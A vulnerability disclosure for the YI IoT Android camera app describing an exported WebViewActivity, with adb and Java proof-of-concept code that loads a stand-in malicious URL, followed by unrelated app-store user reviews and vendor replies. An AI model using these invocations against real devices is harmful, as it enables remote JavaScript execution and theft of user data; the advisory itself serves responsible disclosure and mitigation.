## Vulnerability Details

**Product:** YI IoT 'com.yunyi.smartcamera'
**Version:** up to 4.1.9\_20231127
**Vendor:** Kami Vision
**Component Affected:** `com.ants360.yicamera.activity.WebViewActivity`

The activity `com.ants360.yicamera.activity.WebViewActivity` is marked as exported and accepts an implicit Intent, making it accessible from any third-party application. This can be exploited to load a malicious web page in the WebView, leading to remote JavaScript code execution within the context of the application.

```
### Proof of Concept 1 - ADB Invocation

```bash
adb shell am start -n com.yunyi.smartcamera/com.ants360.yicamera.activity.WebViewActivity -e path "https://www.example.com/maliciousContent"
```

### Proof of Concept 2 - Third-party Android Java Code

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.yunyi.smartcamera", "com.ants360.yicamera.activity.WebViewActivity"));
intent.putExtra("path", "https://www.example.com/maliciousContent");
startActivity(intent);
```

This Java code snippet demonstrates how a malicious application can invoke the `WebViewActivity` without any permissions, thereby leveraging the vulnerability.

### Impact

The vulnerability does not require any permissions and can be exploited by any third-party application installed on the same device. It could lead to unauthorized access, data theft, or manipulation of user information.

### Recommended Mitigations

1. Set `android:exported` to `false` for `WebViewActivity` if it is not meant to be accessed externally.

### Steps to Reproduce

1. Install the YI IoT app (version 4.1.7\_20231026).
2. Execute the adb command or the Java code provided above.

August 20, 2024Generally poor interface. Better setups elsewhere. Start by removing the persistent annoying ads for cloud storage, you either want it or not. Being able to adjust the area monitored for movement so that only part of the screen can trigger the alarm, would be helpful.2 people found this review helpfulDid you find this helpful?YesNoKami HKAugust 20, 2024Hi, we are always looking to improve the experience for our users, and really appreciate the feedback.

January 9, 2025This app provides basic access to YI IoT cameras, but it's not very easy to use. It tries to trick the user into believing that a subscription is required to use functions that actually don't require a subscription, and it's very annoying. The camera allows the user to insert an SD card to record video clips, but accessing the video is not an easy task. It's a somewhat hidden function. Dragging down on the camera image reveals a timeline. Recorded videos are marked by blue bars. It's difficult.22 people found this review helpfulDid you find this helpful?YesNoKami HKJanuary 9, 2025Hi, we're sorry to hear that and we would love to take a look at the issue.

January 8, 2025Very useful and good app. High quality cameras. But Ads make you tired. Any emergency, you must watch Ads sometimes for minutes. Trying to get rid of Ads but there is no option in the menu. Keep asking for cloud purchase. I think you need to fix "ads-free" update first. At least give a payable option. Then the app looks like a serious security app. After that people tend to purchasing cloud and other features.6 people found this review helpfulDid you find this helpful?YesNoKami HKJanuary 8, 2025Thank you for your feedback, and we sincerely apologize for the inconvenience caused by the ads in the app. Your feedback helps us understand what’s important to you, and we’ll make sure to share it with our development team for further review.
